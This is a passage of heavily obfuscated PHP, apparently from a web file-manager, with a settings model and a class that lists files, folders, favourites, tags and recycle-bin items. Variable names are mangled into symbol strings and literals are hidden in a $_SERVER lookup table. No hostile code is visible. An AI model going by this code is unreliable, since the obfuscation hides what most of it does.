$this->cacheGet($Ü÷≈“”); $ÀÆ≈§˚π = $this->optionDefault($Ü÷≈“”); $ÀÆ≈§˚π = is_array($ÀÆ≈§˚π) ? $ÀÆ≈§˚π : array(); if (is_array($Å•èÓ∆œ)) { $Å•èÓ∆œ = array_merge($ÀÆ≈§˚π, $Å•èÓ∆œ); return $†⁄⁄¢Üí ? isset($Å•èÓ∆œ[$†⁄⁄¢Üí]) ? $Å•èÓ∆œ[$†⁄⁄¢Üí] : null : $Å•èÓ∆œ; } $∂¢—ÿ⁄˛ = $this->filterWhere(array($ºêãÀÆÇ[33] => $Ü÷≈“”)); $Å•èÓ∆œ = $this->where($∂¢—ÿ⁄˛)->select(); $Å•èÓ∆œ = array_to_keyvalue($Å•èÓ∆œ, $ºêãÀÆÇ[105], $ºêãÀÆÇ[378]); foreach ($Å•èÓ∆œ as $çÎ“úúÁ => $ôâª™§é) { if ($Œ›ÑÚ¥˙ || in_array($çÎ“úúÁ, $this->jsonField)) { $Å•èÓ∆œ[$çÎ“úúÁ] = json_decode($ôâª™§é, !0); } } $this->cacheSet($Ü÷≈“”, $Å•èÓ∆œ); $Å•èÓ∆œ = array_merge($ÀÆ≈§˚π, $Å•èÓ∆œ); return $†⁄⁄¢Üí ? $Å•èÓ∆œ[$†⁄⁄¢Üí] : $Å•èÓ∆œ; } public function set($°áÉâ˙∏, $∫í—≠˜µ = false, $˝´Ö’ÍÒ = '') { $õ°ø˚£◊ =& $_SERVER[ëæªã÷]; $this->cacheRemove($˝´Ö’ÍÒ); $¬ˆ◊õë√ = array(); $Ì‚ï÷Õô = is_array($°áÉâ˙∏) ? $°áÉâ˙∏ : array($°áÉâ˙∏ => $∫í—≠˜µ); foreach ($Ì‚ï÷Õô as $ÔêÒÃ◊ã => $È≠˙Ø’π) { if (is_array($È≠˙Ø’π)) { $È≠˙Ø’π = json_encode_force($È≠˙Ø’π); } $this->checkLength($È≠˙Ø’π, !1, $this->tableName . $õ°ø˚£◊[4] . $°áÉâ˙∏); $È≠˙Ø’π = self::textEncode($È≠˙Ø’π); $Ì‚ï÷Õô = array($õ°ø˚£◊[33] => $˝´Ö’ÍÒ, $õ°ø˚£◊[105] => $ÔêÒÃ◊ã, $õ°ø˚£◊[378] => $È≠˙Ø’π); $¬ˆ◊õë√[] = $this->filterWhere($Ì‚ï÷Õô); } if (!$¬ˆ◊õë√) { return !0; } return $this->addAll($¬ˆ◊õë√, array(), !0); } protected function optionDefault($˜”Î˛¨ç = '') { return !1; } public function setDeep($Æ†µΩøá, $ë¿˝ñ∞€ = false, $œÔµè±Œ = '') { $ç§ÁÌ¥¥ = explode($_SERVER[ëæªã÷][10], $Æ†µΩøá); $†«µ’≤Ã = $this->get(); array_set_value($†«µ’≤Ã, $Æ†µΩøá, $ë¿˝ñ∞€); $this->set($ç§ÁÌ¥¥[0], $†«µ’≤Ã[$ç§ÁÌ¥¥[0]], $œÔµè±Œ); } public function remove($ºÑµ ô—, $«´ú≈üò = '') { $öﬁ˚¿¢è =& $_SERVER[ëæªã÷]; $this->cacheRemove($«´ú≈üò); $Úã‹ﬁÉ  = $this->filterWhere(array($öﬁ˚¿¢è[105] => $ºÑµ ô—, $öﬁ˚¿¢è[33] => $«´ú≈üò)); if (is_null($ºÑµ ô—)) { unset($Úã‹ﬁÉ [$öﬁ˚¿¢è[105]]); } return $this->where($Úã‹ﬁÉ )->delete(); } public function cacheSet($≥¥ñ∫®≠, $ˆ¥ÉêÿË = false) { return Cache::set($this->cacheKey($≥¥ñ∫®≠), $ˆ¥ÉêÿË); } public function cacheGet($Àè‘∂∫õ) { return Cache::get($this->cacheKey($Àè‘∂∫õ)); } public function cacheRemove($∏®¸¸£ß) { return Cache::remove($this->cacheKey($∏®¸¸£ß)); } protected function filterWhere($Êå®√úÃ) { return $Êå®√úÃ; } protected function cacheKey($Å∞‡Ò‡Ç) { return $Å∞‡Ò‡Ç; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\162\143\x65"; protected $tableMeta = array("\x74\x61\142\x6c\145\116\x61\155\145" => "\x69\x6f\x5f\163\157\x75\162\143\x65\137\x6d\x65\x74\141", "\155\145\164\x61\x46\x69\145\154\144" => "\x73\x6f\x75\x72\x63\145\111\104"); protected $dataAuto = array(array("\x6d\x6f\x64\151\146\x79\x54\151\x6d\x65", "\164\x69\x6d\145", "\x69\x6e\x73\x65\x72\x74", "\x66\x75\x6e\143\x74\x69\x6f\156"), array("\143\x72\x65\x61\164\145\x54\x69\155\145", "\x74\x69\155\145", "\151\156\x73\x65\x72\164", "\x66\x75\156\143\164\x69\x6f\156"), array("\x76\x69\145\167\124\x69\x6d\145", "\x74\151\155\x65", "\151\156\163\145\162\164", "\x66\165\x6e\143\164\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($˘À„ù—û) { return $this->listSource(array($_SERVER[ëæªã÷][402] => $˘À„ù—û)); } public function typeName($Œ§ÿ’˛√) { static $¿º¡ó•ñ = array(self::TYPE_SYSTEM => "\x73\x79\163\x74\145\155", self::TYPE_USER => "\165\163\145\162", self::TYPE_GROUP => "\x67\x72\x6f\x75\x70"); return $¿º¡ó•ñ[$Œ§ÿ’˛√ . $_SERVER[ëæªã÷][12]]; } public function sourceListInfo($Ï‘à∑Õ¶, $–õœúÏ« = false) { $û†œÊÄì =& $_SERVER[ëæªã÷]; $Ï‘à∑Õ¶ = $Ï‘à∑Õ¶ ? $Ï‘à∑Õ¶ : array(); $Ï‘à∑Õ¶ = array_filter(array_unique($Ï‘à∑Õ¶)); if (!$Ï‘à∑Õ¶) { return array(); } $–ÙÃö◊â = $this->where(array($û†œÊÄì[403] => array($û†œÊÄì[7], $Ï‘à∑Õ¶)))->select(); $this->_listDataApply($–ÙÃö◊â, $–õœúÏ«); return array_to_keyvalue($–ÙÃö◊â, $û†œÊÄì[403]); } public function pathInfoFilter(&$Æ€¥ ‹ò) { $œ´ºÙ“Ÿ =& $_SERVER[ëæªã÷]; static $Âá≤÷â€ = false; static $•ıÎÚ√Ü = false; static $∂àí™À… = false; if (!$Âá≤÷â€) { $≤ôÑŸˆõ = $œ´ºÙ“Ÿ[404]; $≤ôÑŸˆõ .= $œ´ºÙ“Ÿ[405]; $≤ôÑŸˆõ .= $œ´ºÙ“Ÿ[406]; $∫…∫±Ö¥ = $œ´ºÙ“Ÿ[407]; $ª∂°Ô‘ß = explode($œ´ºÙ“Ÿ[50], $∫…∫±Ö¥); $Âá≤÷â€ = explode($œ´ºÙ“Ÿ[50], $≤ôÑŸˆõ); $•ıÎÚ√Ü = array(); foreach ($Âá≤÷â€ as $óü±˚ˆ«) { if (in_array($óü±˚ˆ«, $ª∂°Ô‘ß)) { continue; } $•ıÎÚ√Ü[] = $óü±˚ˆ«; } $∂àí™À… = explode($œ´ºÙ“Ÿ[50], $œ´ºÙ“Ÿ[408]); } foreach ($∂àí™À… as $â◊Ÿ≈Îú) { if (isset($Æ€¥ ‹ò[$â◊Ÿ≈Îú])) { $Æ€¥ ‹ò[$â◊Ÿ≈Îú] = intval($Æ€¥ ‹ò[$â◊Ÿ≈Îú]); } } $Æ€¥ ‹ò[$œ´ºÙ“Ÿ[88]] = $œ´ºÙ“Ÿ[409] . $Æ€¥ ‹ò[$œ´ºÙ“Ÿ[403]] . $œ´ºÙ“Ÿ[410]; $Æ€¥ ‹ò[$œ´ºÙ“Ÿ[33]] = $Æ€¥ ‹ò[$œ´ºÙ“Ÿ[411]] == 1 ? $œ´ºÙ“Ÿ[89] : $œ´ºÙ“Ÿ[202]; $Æ€¥ ‹ò[$œ´ºÙ“Ÿ[412]] = $this->typeName($Æ€¥ ‹ò[$œ´ºÙ“Ÿ[412]]); if ($Æ€¥ ‹ò[$œ´ºÙ“Ÿ[411]] != 1) { $Æ€¥ ‹ò[$œ´ºÙ“Ÿ[177]] = $Æ€¥ ‹ò[$œ´ºÙ“Ÿ[413]]; unset($Æ€¥ ‹ò[$œ´ºÙ“Ÿ[413]]); } $…ΩüÛÖœ = $Âá≤÷â€; if (isset($Æ€¥ ‹ò[$œ´ºÙ“Ÿ[414]]) && $Æ€¥ ‹ò[$œ´ºÙ“Ÿ[414]][$œ´ºÙ“Ÿ[415]] == -1) { $…ΩüÛÖœ = $•ıÎÚ√Ü; } $Æ€¥ ‹ò = array_field_key($Æ€¥ ‹ò, $…ΩüÛÖœ); return $Æ€¥ ‹ò; } public function listUserFav() { $ÇﬁÓØ≤î =& $_SERVER[ëæªã÷]; $ÆΩë∑Êû = Model($ÇﬁÓØ≤î[416])->listData(); $∏»∞î˚∑ = array_filter_by_field($ÆΩë∑Êû, $ÇﬁÓØ≤î[33], $ÇﬁÓØ≤î[417]); $∏»∞î˚∑ = array_to_keyvalue($∏»∞î˚∑, $ÇﬁÓØ≤î[12], $ÇﬁÓØ≤î[88]); if ($∏»∞î˚∑) { $ÂË¢‚œÏ = $this->listSource(array($ÇﬁÓØ≤î[418] => array($ÇﬁÓØ≤î[419], $∏»∞î˚∑))); } $ÂË¢‚œÏ = array_to_keyvalue($ÂË¢‚œÏ[$ÇﬁÓØ≤î[373]], $ÇﬁÓØ≤î[403]); foreach ($ÆΩë∑Êû as &$Ô¢›ı≠ï) { $Ô¢›ı≠ï = array($ÇﬁÓØ≤î[420] => $Ô¢›ı≠ï[$ÇﬁÓØ≤î[401]], $ÇﬁÓØ≤î[421] => $Ô¢›ı≠ï[$ÇﬁÓØ≤î[32]], $ÇﬁÓØ≤î[422] => $Ô¢›ı≠ï[$ÇﬁÓØ≤î[88]], $ÇﬁÓØ≤î[423] => $Ô¢›ı≠ï[$ÇﬁÓØ≤î[33]], $ÇﬁÓØ≤î[424] => $Ô¢›ı≠ï[$ÇﬁÓØ≤î[203]], $ÇﬁÓØ≤î[425] => $Ô¢›ı≠ï[$ÇﬁÓØ≤î[96]]); if ($Ô¢›ı≠ï[$ÇﬁÓØ≤î[33]] == $ÇﬁÓØ≤î[417] && $ÂË¢‚œÏ[$Ô¢›ı≠ï[$ÇﬁÓØ≤î[88]]]) { $Ô¢›ı≠ï[$ÇﬁÓØ≤î[97]] = $ÂË¢‚œÏ[$Ô¢›ı≠ï[$ÇﬁÓØ≤î[88]]]; } } unset($Ô¢›ı≠ï); return $ÆΩë∑Êû; } public function listUserTag($†≈É‡›≠) { $ò”ÉÔ·ç =& $_SERVER[ëæªã÷]; if ($†≈É‡›≠ && !is_array($†≈É‡›≠)) { $†≈É‡›≠ = array($†≈É‡›≠); } $“Ì‰Ù¥· = Model($ò”ÉÔ·ç[426])->listData(); $∏ıÀ¸Ê§ = array(); foreach ($“Ì‰Ù¥· as $éüÅ··Œ) { $áÌ¸ ü⁄ = $éüÅ··Œ[$ò”ÉÔ·ç[88]]; if (!$áÌ¸ ü⁄) { continue; } if (!isset($∏ıÀ¸Ê§[$áÌ¸ ü⁄])) { $∏ıÀ¸Ê§[$áÌ¸ ü⁄] = array(); } $∏ıÀ¸Ê§[$áÌ¸ ü⁄][] = $éüÅ··Œ[$ò”ÉÔ·ç[427]]; } $°≥ã¬Ωã = array(); foreach ($∏ıÀ¸Ê§ as $ΩÜ“—Ë≠ => $Ò»ª≤¿‡) { $¨äÖ∞‘é = !0; if (!$†≈É‡›≠) { $°≥ã¬Ωã[] = $ΩÜ“—Ë≠; continue; } foreach ($†≈É‡›≠ as $”˘ÄÊù±) { if (!in_array($”˘ÄÊù±, $Ò»ª≤¿‡)) { $¨äÖ∞‘é = !1; break; } } if ($¨äÖ∞‘é) { $°≥ã¬Ωã[] = $ΩÜ“—Ë≠; } } if (!$°≥ã¬Ωã) { return array(); } $§óÄ÷Ú´ = $this->listSource(array($ò”ÉÔ·ç[418] => array($ò”ÉÔ·ç[419], $°≥ã¬Ωã))); if (!$§óÄ÷Ú´ || count($°≥ã¬Ωã) == $§óÄ÷Ú´[$ò”ÉÔ·ç[370]][$ò”ÉÔ·ç[371]]) { return $§óÄ÷Ú´; } $ÓÈ«ºÕè = array(); $Ù£≈≥ñ› = array_to_keyvalue($§óÄ÷Ú´[$ò”ÉÔ·ç[87]], $ò”ÉÔ·ç[12], $ò”ÉÔ·ç[403]); $„∏ÑÖ˝ø = array_to_keyvalue($§óÄ÷Ú´[$ò”ÉÔ·ç[86]], $ò”ÉÔ·ç[12], $ò”ÉÔ·ç[403]); $˙˚˘Ò∫€ = array_merge($„∏ÑÖ˝ø, $Ù£≈≥ñ›); foreach ($°≥ã¬Ωã as $áÌ¸ ü⁄) { if (!in_array($áÌ¸ ü⁄, $˙˚˘Ò∫€)) { $ÓÈ«ºÕè[] = $áÌ¸ ü⁄; } } if ($ÓÈ«ºÕè) { Model($ò”ÉÔ·ç[428])->removeBySource($ÓÈ«ºÕè); } return $§óÄ÷Ú´; } public function listUserRecycle() { $ø∑Ø´äÓ =& $_SERVER[ëæªã÷]; $Ωóæ÷¢Ä = Model($ø∑Ø´äÓ[429])->listData(); if (!$Ωóæ÷¢Ä) { return array(); } $ùÖ—ØÖß = array($ø∑Ø´äÓ[418] => array($ø∑Ø´äÓ[419], $Ωóæ÷¢Ä), $ø∑Ø´äÓ[430] => 1); return $this->listSource($ùÖ—ØÖß); } public function listSource($«≠°Öë∑, $´¡·ﬁ◊¡ = 3000) { $µ¨ﬂ…¯ﬂ =& $_SERVER[ëæªã÷]; if (!isset($«≠°Öë∑[$µ¨ﬂ…¯ﬂ[431]])) { $«≠°Öë∑[$µ¨ﬂ…¯ﬂ[431]] = 0; } $˛ñÒ∂ü˜ = $µ¨ﬂ…¯ﬂ[432]; $ìª›’Ê… = $this->field($˛ñÒ∂ü˜)->_makeOrder()->where($«≠°Öë∑)->selectPage($´¡·ﬁ◊¡); $this->_listPageCheck($ìª›’Ê…, $˛ñÒ∂ü˜, $«≠°Öë∑); $this->_listDataApply($ìª›’Ê…[$µ¨ﬂ…¯ﬂ[373]]); $this->_listMake($ìª›’Ê…); return $ìª›’Ê…; } private function _listPageCheck(&$£ï˜¡¸, $–˙Ë¸Úﬂ, $§ﬂæ◊Ã—) { $’åÓ°÷å =& $_SERVER[ëæªã÷]; if (!is_array($£ï˜¡¸[$’åÓ°÷å[370]])) { return; } $…æÔñ£ø = $£ï˜¡¸[$’åÓ°÷å[370]]; if ($…æÔñ£ø[$’åÓ°÷å[372]] <= 1) { return; } if ($…æÔñ£ø[$’åÓ°÷å[371]] >= 100000) { return; } if (Model($’åÓ°÷å[433])->get($’åÓ°÷å[434]) != $’åÓ°÷å[435]) { return; } $–˙Ë¸Úﬂ = str_replace(array($’åÓ°÷å[53], $’åÓ°÷å[346], $’åÓ°÷å[65]), $’åÓ°÷å[12], $–˙Ë¸Úﬂ); $–˙Ë¸Úﬂ = $’åÓ°÷å[436] . str_replace($’åÓ°÷å[50], $’åÓ°÷å[437], $–˙Ë¸Úﬂ) . $’åÓ°÷å[438]; $èò«ª˙¥ = $’åÓ°÷å[439]; $èò«ª˙¥ = $èò«ª˙¥ . $’åÓ°÷å[440]; $ÔÈ˛≈úò = $…æÔñ£ø[$’åÓ°÷å[367]] * ($…æÔñ£ø[$’åÓ°÷å[357]] - 1) . $’åÓ°÷å[50] . $…æÔñ£ø[$’åÓ°÷å[367]]; $ñú∂ë∏… = $this->_makeOrder(!0); $ã…ä√∫„ = $’åÓ°÷å[436] . str_replace($’åÓ°÷å[50], $’åÓ°÷å[437], $ñú∂ë∏…[0]); if (strpos($ã…ä√∫„, $’åÓ°÷å[441])) { $ã…ä√∫„ = str_replace($’åÓ°÷å[441], $’åÓ°÷å[442], $ã…ä√∫„); } else { $ã…ä√∫„ .= $’åÓ°÷å[443] . $ñú∂ë∏…[1]; } $Œµﬁ‘Ù∆ = array(); foreach ($§ﬂæ◊Ã— as $îì⁄ıó® => $∏ƒ—≥ÊÔ) { $Œµﬁ‘Ù∆[$’åÓ°÷å[436] . $îì⁄ıó®] = $∏ƒ—≥ÊÔ; } $this->alias($’åÓ°÷å[444])->field($–˙Ë¸Úﬂ)->limit($ÔÈ˛≈úò)->order($ã…ä√∫„); $œ≥ñ·õ‡ = $this->join($èò«ª˙¥)->where($Œµﬁ‘Ù∆)->select(); if ($œ≥ñ·õ‡) { $£ï˜¡¸[$’åÓ°÷å[373]] = $œ≥ñ·õ‡; } } protected function _makeOrder($á≤“ØÂ = false) { $˙∏êŸôä =& $_SERVER[ëæªã÷]; $ Ñ«Ω√ú = Model($˙∏êŸôä[445])->get($˙∏êŸôä[446]); $€‡æ—µû = Model($˙∏êŸôä[445])->get($˙∏êŸôä[447]); $ ÌÂÉíÔ = array($˙∏êŸôä[448] => $˙∏êŸôä[449], $˙∏êŸôä[450] => $˙∏êŸôä[451]); $˜Û‘Â§’ = array($˙∏êŸôä[32] => $˙∏êŸôä[32], $˙∏êŸôä[90] => $˙∏êŸôä[90], $˙∏êŸôä[177] => $˙∏êŸôä[413], $˙∏êŸôä[452] => $˙∏êŸôä[452], $˙∏êŸôä[453] => $˙∏êŸôä[454], $˙∏êŸôä[203] => $˙∏êŸôä[203], $˙∏êŸôä[96] => $˙∏êŸôä[96]); $Ü›÷““ß = Input::get($˙∏êŸôä[455], $˙∏êŸôä[7], $ Ñ«Ω√ú, array_keys($˜Û‘Â§’)); $ËÔ¥√·œ = Input::get($˙∏êŸôä[456], $˙∏êŸôä[7], $€‡æ—µû, array_keys($ ÌÂÉíÔ)); if (!in_array($Ü›÷““ß, array_keys($˜Û‘Â§’))) { $Ü›÷““ß = $˙∏êŸôä[32]; } if (!in_array($ËÔ¥√·œ, array_keys($ ÌÂÉíÔ))) { $Ü›÷““ß = $˙∏êŸôä[448]; } if ($Ü›÷““ß == $˙∏êŸôä[32]) { } $Ïéª’∞Á = $˙∏êŸôä[457] . $˜Û‘Â§’[$Ü›÷““ß] . $˙∏êŸôä[53] . $ ÌÂÉíÔ[$ËÔ¥√·œ]; $Ïéª’∞Á = rtrim(trim($Ïéª’∞Á), $˙∏êŸôä[50]); if ($á≤“ØÂ) { return array($Ïéª’∞Á, $ ÌÂÉíÔ[$ËÔ¥√·œ]); } return $this->order($Ïéª’∞Á); } protected function _listDataApplyItem($Ö±≈ÆÂæ, $ıß˜‚Öü = false) { $¬ÙîÑŒÿ = array($Ö±≈ÆÂæ); $this->_listDataApply($¬ÙîÑŒÿ, $ıß˜‚Öü); return $¬ÙîÑŒÿ[0]; } protected function _listDataApply(&$ƒ≠πØÇÓ, $ï®Œ∞â∫ = false) { $ÏÓÎÓΩ© =& $_SERVER[ëæªã÷]; if (!$ƒ≠πØÇÓ) { $ƒ≠πØÇÓ = array(); return; } $◊‹£Õ≈¬ = array_to_keyvalue($ƒ≠πØÇÓ, $ÏÓÎÓΩ©[12], $ÏÓÎÓΩ©[403]); $◊‹£Õ≈¬ = array_unique($◊‹£Õ≈¬); $this->_listSourceCache($ƒ≠πØÇÓ); if (!$ï®Œ∞â∫) { $this->_listAppendMeta($ƒ≠πØÇÓ, $◊‹£Õ≈¬); $this->_listAppendFileMeta($ƒ≠πØÇÓ, $◊‹£Õ≈¬); $this->_listAppendChildren($ƒ≠πØÇÓ, $◊‹£Õ≈¬); } $this->_listAppendPath($ƒ≠πØÇÓ); $this->_listAppendAuth($ƒ≠πØÇÓ); $this->_listAppendSourceInfo($ƒ≠πØÇÓ, $◊‹£Õ≈¬); $this->_listAppendUser($ƒ≠πØÇÓ); $this->_listFilterInfo($ƒ≠πØÇÓ, $ï®Œ∞â∫); $this->_listAppendAuthSecret($ƒ≠πØÇÓ); } protected function _listSourceCache($øú¿≤¥È) { $¸àÑªµ¡ =& $_SERVER[ëæªã÷]; foreach ($øú¿≤¥È as $∆áô≤â◊) { self::$cacheSourceInfo[$¸àÑªµ¡[458] . $∆áô≤â◊[$¸àÑªµ¡[403]]] = $∆áô≤â◊; } } protected function _listFilterInfo(&$÷£≤’˛∫, $ÌêÜ∏˘∞ = false) { $â∏¥ÌªÛ =& $_SERVER[ëæªã÷]; foreach ($÷£≤’˛∫ as &$”Û÷ÌôÚ) { $”Û÷ÌôÚ = $this->pathInfoFilter($”Û÷ÌôÚ); self::$cachePathInfo[$â∏¥ÌªÛ[459] . intval($ÌêÜ∏˘∞) . $â∏¥ÌªÛ[460] . $”Û÷ÌôÚ[$â∏¥ÌªÛ[403]]] = $”Û÷ÌôÚ; } unset($”Û÷ÌôÚ); } protected function _listMake(&$ç∂¶ÅΩ–) { $¨ö⁄Å£ﬁ =& $_SERVER[ëæªã÷]; $ç∂¶ÅΩ–[$¨ö⁄Å£ﬁ[87]] = array(); $ç∂¶ÅΩ–[$¨ö⁄Å£ﬁ[86]] = array(); foreach ($ç∂¶ÅΩ–[$¨ö⁄Å£ﬁ[373]] as $±Úäπ∞®) { $¸˘‰æúå = $±Úäπ∞®[$¨ö⁄Å£ﬁ[411]] == 1 ? $¨ö⁄Å£ﬁ[87] : $¨ö⁄Å£ﬁ[86]; $ç∂¶ÅΩ–[$¸˘‰æúå][] = $±Úäπ∞®; } unset($ç∂¶ÅΩ–[$¨ö⁄Å£ﬁ[373]]); } protected function _listAppendMeta(&$á√´Ω‰Ô, $æÊÙóî≤) { $πÌÏ»äﬂ =& $_SERVER[ëæªã÷]; $¯˘ﬁÊî¶ = array($πÌÏ»äﬂ[418] => array($πÌÏ»äﬂ[419], $æÊÙóî≤)); $—˛Ÿã√Ù = Model($πÌÏ»äﬂ[461])->field($πÌÏ»äﬂ[462])->where($¯˘ﬁÊî¶)->select(); if (!$—˛Ÿã√Ù) { return; } $∆È∞œ∫ë = array($πÌÏ»äﬂ[463], $πÌÏ»äﬂ[464], $πÌÏ»äﬂ[442]); $ıÛ≠ÁÁÊ = array(); foreach ($—˛Ÿã√Ù as $˛∑¢‘´Í) { if (!isset($ıÛ≠ÁÁÊ[$˛∑¢‘´Í[$πÌÏ»äﬂ[403]]])) { $ıÛ≠ÁÁÊ[$˛∑¢‘´Í[$πÌÏ»äﬂ[403]]] = array(); } if (in_array($˛∑¢‘´Í[$πÌÏ»äﬂ[105]], $∆È∞œ∫ë)) { continue; } $ıÛ≠ÁÁÊ[$˛∑¢‘´Í[$πÌÏ»äﬂ[403]]][$˛∑¢‘´Í[$πÌÏ»äﬂ[105]]] = $˛∑¢‘´Í[$πÌÏ»äﬂ[378]]; } foreach ($á√´Ω‰Ô as &$€ƒ˘Éä§) { $€ƒ˘Éä§[$πÌÏ»äﬂ[465]] = !1; if (isset($ıÛ≠ÁÁÊ[$€ƒ˘Éä§[$πÌÏ»äﬂ[403]]])) { $€ƒ˘Éä§[$πÌÏ»äﬂ[465]] = $ıÛ≠ÁÁÊ[$€ƒ˘Éä§[$πÌÏ»äﬂ[403]]]; } if ($this->fileIsLock($€ƒ˘Éä§) && $€ƒ˘Éä§[$πÌÏ»äﬂ[414]]) { $È∑ª∫ºß = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $€ƒ˘Éä§[$πÌÏ»äﬂ[414]][$πÌÏ»äﬂ[415]] = AuthModel::authDisable($€ƒ˘Éä§[$πÌÏ»äﬂ[414]][$πÌÏ»äﬂ[415]], $È∑ª∫ºß); $€ƒ˘Éä§[$πÌÏ»äﬂ[414]][$πÌÏ»äﬂ[466]][$πÌÏ»äﬂ[414]] = $€ƒ˘Éä§[$πÌÏ»äﬂ[414]][$πÌÏ»äﬂ[415]]; } } unset($€ƒ˘Éä§); } protected function _listAppendFileMeta(&$¨ÛÛﬂÈ≥, $ÖØû†Ò) { $ãØé¯ä˚ =& $_SERVER[ëæªã÷]; $≤∫„ﬂÙ∑ = array_to_keyvalue($¨ÛÛﬂÈ≥, $ãØé¯ä˚[12], $ãØé¯ä˚[467]); $≤∫„ﬂÙ∑ = array_filter(array_unique($≤∫„ﬂÙ∑)); if (!$≤∫„ﬂÙ∑) { return; } $Ëßóôäø = array($ãØé¯ä˚[468] => array($ãØé¯ä˚[419], $≤∫„ﬂÙ∑)); $á≥ç–÷ = $ãØé¯ä˚[469]; $ÎõÛ™ß· = Model($ãØé¯ä˚[470])->field($á≥ç–÷)->where($Ëßóôäø)->select(); $ÎõÛ™ß· = array_to_keyvalue($ÎõÛ™ß·, $ãØé¯ä˚[467]); $üÄüæ≤˜ = Model($ãØé¯ä˚[471])->field($ãØé¯ä˚[472])->where($Ëßóôäø)->select(); $üÄüæ≤˜ = $üÄüæ≤˜ ? $üÄüæ≤˜ : array(); $∫ÀÉΩ≈˘ = array(); foreach ($üÄüæ≤˜ as $ç€•ÂøÅ) { if (!isset($∫ÀÉΩ≈˘[$ç€•ÂøÅ[$ãØé¯ä˚[467]]])) { $∫ÀÉΩ≈˘[$ç€•ÂøÅ[$ãØé¯ä˚[467]]] = array(); } $∫ÀÉΩ≈˘[$ç€•ÂøÅ[$ãØé¯ä˚[467]]][$ç€•ÂøÅ[$ãØé¯ä˚[105]]] = $ç€•ÂøÅ[$ãØé¯ä˚[378]]; } foreach ($¨ÛÛﬂÈ≥ as &$Ãé≠áÆÒ) { $Ñ⁄°∆ì• = $Ãé≠áÆÒ[$ãØé¯ä˚[467]]; if (!$Ñ⁄°∆ì• || !is_array($ÎõÛ™ß·[$Ñ⁄°∆ì•])) { continue; } $Í˜—ñ∏ﬂ = $ÎõÛ™ß·[$Ñ⁄°∆ì•]; $Í˜—ñ∏ﬂ[$ãØé¯ä˚[90]] = $Ãé≠áÆÒ[$ãØé¯ä˚[90]]; $Í˜—ñ∏ﬂ[$ãØé¯ä˚[32]] = $Ãé≠áÆÒ[$ãØé¯ä˚[32]]; if (!isset(self::$cacheFileInfo[$ãØé¯ä˚[473] . $Ñ⁄°∆ì•])) { self::$cacheFileInfo[$ãØé¯ä˚[473] . $Ñ⁄°∆ì•] = array_merge(array(), $Í˜—ñ∏ﬂ); } unset($ÎõÛ™ß·[$Ñ⁄°∆ì•][$ãØé¯ä˚[88]]); $†”‘èï© = is_array($∫ÀÉΩ≈˘[$Ñ⁄°∆ì•]) ? $∫ÀÉΩ≈˘[$Ñ⁄°∆ì•] : array(); $Ãé≠áÆÒ[$ãØé¯ä˚[173]] = array_merge($†”‘èï©, $ÎõÛ™ß·[$Ñ⁄°∆ì•]); if (isset($Ãé≠áÆÒ[$ãØé¯ä˚[173]][$ãØé¯ä˚[172]])) { $Ãé≠áÆÒ[$ãØé¯ä˚[172]] = json_decode($Ãé≠áÆÒ[$ãØé¯ä˚[173]][$ãØé¯ä˚[172]], !0); unset($Ãé≠áÆÒ[$ãØé¯ä˚[173]][$ãØé¯ä˚[172]]); } } unset($Ãé≠áÆÒ); } protected function _listAppendSourceInfo(&$Õç∫Ü«á, $öÓ¥Îÿ•) { $õú´≠õª =& $_SERVER[ëæªã÷]; if (!defined($õú´≠õª[474])) { return; } $µ∏ãÎ£» = Model($õú´≠õª[475])->listData(); $é«òí•≈ = Model($õú´≠õª[426])->listData(); $˛‘ÙüÇæ = Model($õú´≠õª[416])->listData(); $èﬁôéÿ‰ = Model($õú´≠õª[476])->listSimple(); $∏¨˙∫ÒÈ = array_to_keyvalue($µ∏ãÎ£», $õú´≠õª[401]); $´Ë£≠ÄÒ = array_to_keyvalue_group($é«òí•≈, $õú´≠õª[88], $õú´≠õª[427]); $îÅ√Ö„· = array_to_keyvalue($˛‘ÙüÇæ, $õú´≠õª[88]); $¡√‘¯‚ï = array_to_keyvalue_group($èﬁôéÿ‰, $õú´≠õª[403]); foreach ($Õç∫Ü«á as &$ÑõîÙõñ) { $ÑõîÙõñ[$õú´≠õª[97]] = array($õú´≠õª[477] => 0, $õú´≠õª[478] => 0, $õú´≠õª[479] => 0); if (isset($îÅ√Ö„·[$ÑõîÙõñ[$õú´≠õª[403]]])) { $ÑõîÙõñ[$õú´≠õª[97]][$õú´≠õª[480]] = 1; $ÑõîÙõñ[$õú´≠õª[97]][$õú´≠õª[481]] = $îÅ√Ö„·[$ÑõîÙõñ[$õú´≠õª[403]]][$õú´≠õª[32]]; } if (isset($´Ë£≠ÄÒ[$ÑõîÙõñ[$õú´≠õª[403]]])) { $ÑõîÙõñ[$õú´≠õª[97]][$õú´≠õª[482]] = array(); foreach ($´Ë£≠ÄÒ[$ÑõîÙõñ[$õú´≠õª[403]]] as $“µ…πœÃ) { $≠ÚÓôñ™ = $∏¨˙∫ÒÈ[$“µ…πœÃ]; $ÑõîÙõñ[$õú´≠õª[97]][$õú´≠õª[482]][] = array($õú´≠õª[483] => $≠ÚÓôñ™[$õú´≠õª[401]], $õú´≠õª[421] => $≠ÚÓôñ™[$õú´≠õª[32]], $õú´≠õª[484] => $≠ÚÓôñ™[$õú´≠õª[485]]); } } if (isset($¡√‘¯‚ï[$ÑõîÙõñ[$õú´≠õª[403]]])) { $ÑõîÙõñ[$õú´≠õª[97]][$õú´≠õª[486]] = array(); foreach ($¡√‘¯‚ï[$ÑõîÙõñ[$õú´≠õª[403]]] as $‡ï Á»î) { $ÑõîÙõñ[$õú´≠õª[97]][$õú´≠õª[486]] = array($õú´≠õª[487] => $‡ï Á»î[$õú´≠õª[488]], $õú´≠õª[489] => $‡ï Á»î[$õú´≠õª[490]], $õú´≠õª[491] => $‡ï Á»î[$õú´≠õª[403]], $õú´≠õª[492] => $‡ï Á»î[$õú´≠õª[493]], $õú´≠õª[494] => $‡ï Á»î[$õú´≠õª[495]], $õú´≠õª[496] => $‡ï Á»î[$õú´≠õª[496]], $õú´≠õª[497] => $‡ï Á»î[$õú´≠õª[497]]); } } } unset($ÑõîÙõñ); return $Õç∫Ü«á; } protected function _listAppendChildren(&$æÔ¨‡√è, $◊©…ÄÇı) { $®â˛Ïâ§ =& $_SERVER[ëæªã÷]; $·∞ª∆§π = array(); 